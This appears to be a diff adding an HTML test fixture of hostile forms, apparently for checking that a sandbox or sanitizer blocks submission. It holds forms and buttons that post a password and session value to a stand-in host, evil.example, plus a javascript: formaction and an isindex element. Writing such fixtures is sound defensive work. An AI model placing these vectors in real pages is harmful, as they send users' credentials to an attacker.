@@ -1,0 +1,13 @@
+<html><body>
+<p>Hostile fixture 04: forms. Nothing may be submitted.</p>
+<form action="https://evil.example/collect" method="post">
+  <label>Password <input type="password" name="pw" value="hunter2"></label>
+  <input type="hidden" name="session" value="x">
+  <input type="image" src="https://evil.example/button.png">
+  <button>Sign in</button>
+  <button formaction="javascript:parent.__pwned='formaction'">Other</button>
+  <textarea name="t">x</textarea><select name="s"><option>a</option></select>
+</form>
+<button form="detached" formaction="https://evil.example/detached">Detached button</button>
+<isindex action="https://evil.example/isindex">
+</body></html>
